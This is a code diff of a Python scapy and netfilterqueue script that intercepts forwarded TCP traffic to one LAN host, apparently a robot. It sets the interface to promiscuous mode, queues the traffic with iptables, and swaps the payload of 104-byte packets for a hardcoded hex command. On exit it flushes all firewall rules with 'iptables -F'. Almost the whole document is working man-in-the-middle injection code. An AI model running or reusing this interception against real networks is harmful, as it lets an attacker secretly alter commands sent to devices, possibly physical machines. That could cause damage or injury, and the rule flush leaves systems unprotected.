@@ -1,14 +1,20 @@
 #!/usr/bin/python
 from scapy.all import *
 from netfilterqueue import NetfilterQueue
+import sys
+import os
+import time
+
+print "\n[*] Redirect traffic to the NFQUEUE... \n"
+os.system("ip link set dev enp0s3 promisc on")
+os.system("iptables -A FORWARD -p tcp -d 192.168.1.241 -j NFQUEUE --queue-num 1")
+#os.system("iptables -t nat -A PREROUTING -p tcp -d "+robotIP+" -j NFQUEUE --queue-num 1")
 
 def modify(packet):
-    print packet.show()
+
     pkt = IP(packet.get_payload()) #converts the raw packet to a scapy compatible string
 
     #modify the packet all you want here
-    
-    #pkt.replace("hello","Hola")
 
     packet.set_payload(str(pkt)) #set the packet content to our modified version
 
@@ -45,12 +51,10 @@ def print_and_accept(pkt):
 
     #modify payload
     payload = str(packet[TCP].payload)
-    #payload_hex =  payload.encode("HEX")
-    #print payload_hex
     print payload
     payload_hex='300000009a9999999999c9bf00000000000000000000000000000000000000000000000000000000000000000000000000000000'
-    if packet[IP].len==104:    
-        payload = str(payload_hex.decode("HEX"))    
+    if packet[IP].len==104:
+    	payload = str(payload_hex.decode("HEX"))    
     #payload = payload.replace("world","kajak")
     print payload
     packet[TCP].remove_payload()
@@ -74,5 +78,6 @@ try:
     nfqueue.run()
 except KeyboardInterrupt:
     nfqueue.unbind()
+    os.system("iptables -F")
 
 
